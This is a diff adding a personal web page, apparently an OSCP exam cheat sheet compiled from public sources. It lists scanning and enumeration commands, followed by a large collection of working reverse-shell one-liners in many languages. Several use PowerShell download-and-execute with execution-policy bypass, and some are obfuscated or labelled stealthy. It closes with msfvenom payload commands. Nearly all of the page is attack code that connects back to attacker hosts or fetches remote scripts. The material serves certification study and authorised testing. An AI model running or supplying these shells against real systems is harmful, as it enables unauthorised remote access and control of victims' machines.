@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP :: m1thryn.github.io</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="M1thryn&amp;rsquo;s OSCP Cheat Sheet Work in progress!!!! This is a compilation of many public cheat sheets. They are linked at the bottom under the Resources section.
+Table of Contents  Banner Grabbing Port Scanning Service Enumeration  DNS SMB HTTP   Reverse Shells  TTY Upgrade Bash TCP Bash UDP Socat Perl Python PHP Ruby Go Netcat Netcat OpenBSD Ncat OpenSSL Powershell Awk Java C   MSFVenom  Windows Staged Reverse TCP Windows Stageless Reverse TCP Windows Staged Meterpreter Linux Staged Reverse TCP Linux Stageless Reverse TCP Linux Staged Meterpreter Web Payloads   Pivoting  Chisel   Resources  Banner Grabbing /dev/tcp/ip/port or /dev/udp/ip/port" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/oscp/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/skull-68-64.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="m1thryn" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP :: m1thryn.github.io">
+<meta property="og:description" content="M1thryn&amp;rsquo;s OSCP Cheat Sheet Work in progress!!!! This is a compilation of many public cheat sheets. They are linked at the bottom under the Resources section.
+Table of Contents  Banner Grabbing Port Scanning Service Enumeration  DNS SMB HTTP   Reverse Shells  TTY Upgrade Bash TCP Bash UDP Socat Perl Python PHP Ruby Go Netcat Netcat OpenBSD Ncat OpenSSL Powershell Awk Java C   MSFVenom  Windows Staged Reverse TCP Windows Stageless Reverse TCP Windows Staged Meterpreter Linux Staged Reverse TCP Linux Stageless Reverse TCP Linux Staged Meterpreter Web Payloads   Pivoting  Chisel   Resources  Banner Grabbing /dev/tcp/ip/port or /dev/udp/ip/port" />
+<meta property="og:url" content="/oscp/" />
+<meta property="og:site_name" content="OSCP" />
+
+  
+    <meta property="og:image" content="/img/favicon/skull-68-64.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-01-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    m1thryn.github.io
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/oscp">OSCP Cheet Sheet</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/recommendations">Recommendations</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP Cheet Sheet</a></li>
+      
+    
+      
+        <li><a href="/recommendations">Recommendations</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/oscp/">OSCP</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-01-10 
+      </span>
+    
+    
+    <span class="post-author">:: m1thryn</span>
+    
+  </div>
+
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="m1thryns-oscp-cheat-sheet"><strong>M1thryn&rsquo;s OSCP Cheat Sheet</strong><a href="#m1thryns-oscp-cheat-sheet" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Work in progress!!!! This is a compilation of many public cheat sheets. They are linked at the bottom under the <code>Resources</code> section.</p>
+<h1 id="table-of-contents"><strong>Table of Contents</strong><a href="#table-of-contents" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><a href="#banner-grabbing">Banner Grabbing</a></li>
+<li><a href="#port-scanning">Port Scanning</a></li>
+<li><a href="#service-enumeration">Service Enumeration</a>
+<ul>
+<li><a href="##dns">DNS</a></li>
+<li><a href="##dns">SMB</a></li>
+<li><a href="##dns">HTTP</a></li>
+</ul>
+</li>
+<li><a href="#reverse-shells">Reverse Shells</a>
+<ul>
+<li><a href="##tty-upgrade">TTY Upgrade</a></li>
+<li><a href="#bash-tcp">Bash TCP</a></li>
+<li><a href="#bash-udp">Bash UDP</a></li>
+<li><a href="#socat">Socat</a></li>
+<li><a href="#perl">Perl</a></li>
+<li><a href="#python">Python</a></li>
+<li><a href="#php">PHP</a></li>
+<li><a href="#ruby">Ruby</a></li>
+<li><a href="#golang">Go</a></li>
+<li><a href="#netcat-traditional">Netcat</a></li>
+<li><a href="#netcat-openbsd">Netcat OpenBSD</a></li>
+<li><a href="#ncat">Ncat</a></li>
+<li><a href="#openssl">OpenSSL</a></li>
+<li><a href="#powershell">Powershell</a></li>
+<li><a href="#awk">Awk</a></li>
+<li><a href="#java">Java</a></li>
+<li><a href="#c">C</a></li>
+</ul>
+</li>
+<li><a href="#msfvenom">MSFVenom</a>
+<ul>
+<li><a href="#windows-staged-reverse-tcp">Windows Staged Reverse TCP</a></li>
+<li><a href="#windows-stageless-reverse-tcp">Windows Stageless Reverse TCP</a></li>
+<li><a href="#windows-staged-meterpreter">Windows Staged Meterpreter</a></li>
+<li><a href="#linux-staged-reverse-tcp">Linux Staged Reverse TCP</a></li>
+<li><a href="#linux-stageless-reverse-tcp">Linux Stageless Reverse TCP</a></li>
+<li><a href="#linux-staged-meterpreter">Linux Staged Meterpreter</a></li>
+<li><a href="#web-payloads">Web Payloads</a></li>
+</ul>
+</li>
+<li><a href="#pivoting">Pivoting</a>
+<ul>
+<li><a href="#chisel">Chisel</a></li>
+</ul>
+</li>
+<li><a href="#resources">Resources</a></li>
+</ul>
+<h2 id="banner-grabbing"><strong>Banner Grabbing</strong><a href="#banner-grabbing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>/dev/tcp/ip/port or /dev/udp/ip/port</strong></p>
+<pre><code>cat &lt; /dev/tcp/192.168.30.253/22
+SSH-2.0-OpenSSH_6.2p2 Debian-6
+^C pressed here
+</code></pre><p><strong>Telnet</strong></p>
+<pre><code>telnet 192.168.30.253 22
+SSH-2.0-OpenSSH_6.2p2 Debian-6
+^C pressed here
+</code></pre><h2 id="port-scanning"><strong>Port Scanning</strong><a href="#port-scanning" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Nmap</strong></p>
+<p><strong>nc + bash</strong></p>
+<pre><code>top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in &quot;${top10[@]}&quot;; do nc -w 1 192.168.30.253 $i &amp;&amp; echo &quot;Port $i is open&quot; || echo &quot;Port $i is closed or filtered&quot;; done
+</code></pre><p><strong>/dev/tcp/ip/port or /dev/udp/ip/port</strong></p>
+<pre><code>top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in &quot;${top10[@]}&quot;; do (echo &gt; /dev/tcp/192.168.30.253/&quot;$i&quot;) &gt; /dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Port $i is open&quot; || echo &quot;Port $i is closed&quot;; done
+</code></pre><p><strong>scripted for /24</strong></p>
+<pre><code>#!/bin/bash
+subnet=&quot;192.168.30&quot;
+top10=(20 21 22 23 25 80 110 139 443 445 3389)
+for host in {1..255}; do
+    for port in &quot;${top10[@]}&quot;; do
+        (echo &gt; /dev/tcp/&quot;${subnet}.${host}/${port}&quot;) &gt; /dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Host ${subnet}.${host} has ${port} open&quot; || echo &quot;Host ${subnet}.${host} has ${port} closed&quot;
+    done
+done
+</code></pre><h2 id="service-enumeration"><strong>Service Enumeration</strong><a href="#service-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="dns"><strong>DNS</strong><a href="#dns" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>Zone Transfer</strong></p>
+<pre><code>dig axfr blah.com @ns1.blah.com
+</code></pre><h3 id="http"><strong>HTTP</strong><a href="#http" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h2 id="reverse-shells"><strong>Reverse Shells</strong><a href="#reverse-shells" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="tty-upgrade"><strong>TTY Upgrade</strong><a href="#tty-upgrade" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>Upgrade Basic Shell</strong></p>
+<pre><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+^Z (background shell)
+echo $TERM
+stty -a
+stty raw -echo; fg&lt;enter&gt;&lt;enter&gt;
+stty rows XXX columns XXX
+export TERM=&quot;xterm-256color&quot;
+reset
+</code></pre><p><strong>Python</strong></p>
+<pre><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre><h3 id="bash-tcp"><strong>Bash TCP</strong><a href="#bash-tcp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1
+
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+</code></pre><h3 id="bash-udp"><strong>Bash UDP</strong><a href="#bash-udp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>Victim:
+sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1
+
+Listener:
+nc -u -lvp 4242
+</code></pre><p>Don&rsquo;t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
+<h3 id="socat"><strong>Socat</strong><a href="#socat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
+user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+</code></pre><pre><code>user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+</code></pre><p>Static socat binary can be found at <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries</a></p>
+<h3 id="perl"><strong>Perl</strong><a href="#perl" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+
+
+NOTE: Windows only
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre><h3 id="python"><strong>Python</strong><a href="#python" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>Linux only</strong></p>
+<p><strong>IPv4</strong></p>
+<pre><code>export RHOST=&quot;10.0.0.1&quot;;export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)'
+</code></pre><p><strong>IPv4</strong></p>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre><p><strong>IPv6</strong></p>
+<pre><code>python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);'
+</code></pre><pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre><p><strong>Windows only</strong></p>
+<pre><code>C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))&quot;
+</code></pre><h3 id="php"><strong>PHP</strong><a href="#php" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,4242);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,4242);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,4242);passthru(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,4242);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);'
+</code></pre><pre><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,4242);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'
+</code></pre><pre><code>php -r 'system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.1 4444 &gt;/tmp/f&quot;);'
+</code></pre><h3 id="ruby"><strong>Ruby</strong><a href="#ruby" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,4242).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
+
+NOTE: Windows only
+ruby -rsocket -e 'c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
+</code></pre><h3 id="golang"><strong>Golang</strong><a href="#golang" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>echo 'package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main(){c,_:=net.Dial(&quot;tcp&quot;,&quot;10.0.0.1:4242&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go
+</code></pre><h3 id="netcat-traditional"><strong>Netcat Traditional</strong><a href="#netcat-traditional" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>nc -e /bin/sh 10.0.0.1 4242
+nc -e /bin/bash 10.0.0.1 4242
+nc -c bash 10.0.0.1 4242
+</code></pre><h3 id="netcat-openbsd"><strong>Netcat OpenBsd</strong><a href="#netcat-openbsd" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f
+</code></pre><h3 id="ncat"><strong>Ncat</strong><a href="#ncat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>ncat 10.0.0.1 4242 -e /bin/bash
+ncat --udp 10.0.0.1 4242 -e /bin/bash
+</code></pre><h3 id="openssl"><strong>OpenSSL</strong><a href="#openssl" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Attacker:</p>
+<pre><code>user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+or
+user@attack$ ncat --ssl -vv -l -p 4242
+
+user@victim$ mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.0.0.1:4242 &gt; /tmp/s; rm /tmp/s
+</code></pre><p>TLS-PSK (does not rely on PKI or self-signed certificates)</p>
+<pre><code># generate 384-bit PSK
+# use the generated string as a value for the two PSK variables from below
+openssl rand -hex 48 
+# server (attacker)
+export LHOST=&quot;*&quot;; export LPORT=&quot;4242&quot;; export PSK=&quot;replacewithgeneratedpskfromabove&quot;; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
+# client (victim)
+export RHOST=&quot;10.0.0.1&quot;; export RPORT=&quot;4242&quot;; export PSK=&quot;replacewithgeneratedpskfromabove&quot;; export PIPE=&quot;/tmp/`openssl rand -hex 4`&quot;; mkfifo $PIPE; /bin/sh -i &lt; $PIPE 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT &gt; $PIPE; rm $PIPE
+</code></pre><h3 id="powershell"><strong>Powershell</strong><a href="#powershell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;10.0.0.1&quot;,4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre><pre><code>powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
+</code></pre><p><strong>mini-reverse</strong></p>
+<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+</code></pre><p><strong>Invoke-PowershellTCP</strong></p>
+<pre><code>powershell.exe -nop -ep bypass -c &quot;iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.29:8000/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.29 -Port 80&quot;
+</code></pre><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</a></p>
+<p><strong>Powercat</strong></p>
+<pre><code>powershell.exe -nop -ep bypass -c &quot;iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.29:8000/powercat.ps1'));powercat -c 10.10.14.29 -p 80 -ep&quot;
+</code></pre><p><a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</a></p>
+<h3 id="awk"><strong>Awk</strong><a href="#awk" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>awk 'BEGIN {s = &quot;/inet/tcp/0/10.0.0.1/4242&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}' /dev/null
+</code></pre><h3 id="java"><strong>Java</strong><a href="#java" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+
+</code></pre><p><strong>Java Alternative 1</strong></p>
+<pre><code>String host=&quot;127.0.0.1&quot;;
+int port=4444;
+String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+</code></pre><p><strong>Java Alternative 2</strong></p>
+<p><strong>NOTE</strong>: This is more stealthy</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">Thread thread <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Thread<span style="color:#f92672">(){</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span><span style="color:#f92672">(){</span>
+        <span style="color:#75715e">// Reverse shell here
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+thread<span style="color:#f92672">.</span><span style="color:#a6e22e">start</span><span style="color:#f92672">();</span>
+</code></pre></div><h3 id="c"><strong>C</strong><a href="#c" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+int main(void){
+    int port = 4242;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr(&quot;10.0.0.1&quot;);
+
+    connect(sockt, (struct sockaddr *) &amp;revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {&quot;/bin/sh&quot;, NULL};
+    execve(&quot;/bin/sh&quot;, argv, NULL);
+
+    return 0;       
+}
+</code></pre><h2 id="msfvenom"><strong>MSFVenom</strong><a href="#msfvenom" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="windows-staged-reverse-tcp"><strong>Windows Staged Reverse TCP</strong><a href="#windows-staged-reverse-tcp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>x86</strong></p>
+<pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe
+</code></pre><p><strong>x64</strong></p>
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe
+</code></pre><h3 id="windows-stageless-reverse-tcp"><strong>Windows Stageless Reverse TCP</strong><a href="#windows-stageless-reverse-tcp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>x86</strong></p>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe
+</code></pre><p><strong>x64</strong></p>
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe
+</code></pre><h3 id="windows-staged-meterpreter"><strong>Windows Staged Meterpreter</strong><a href="#windows-staged-meterpreter" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>x86</strong></p>
+<pre><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe
+</code></pre><p><strong>x64</strong></p>
+<pre><code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x64.exe
+</code></pre><h3 id="linux-staged-reverse-tcp"><strong>Linux Staged Reverse TCP</strong><a href="#linux-staged-reverse-tcp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>x86</strong></p>
+<pre><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf
+</code></pre><p><strong>x64</strong></p>
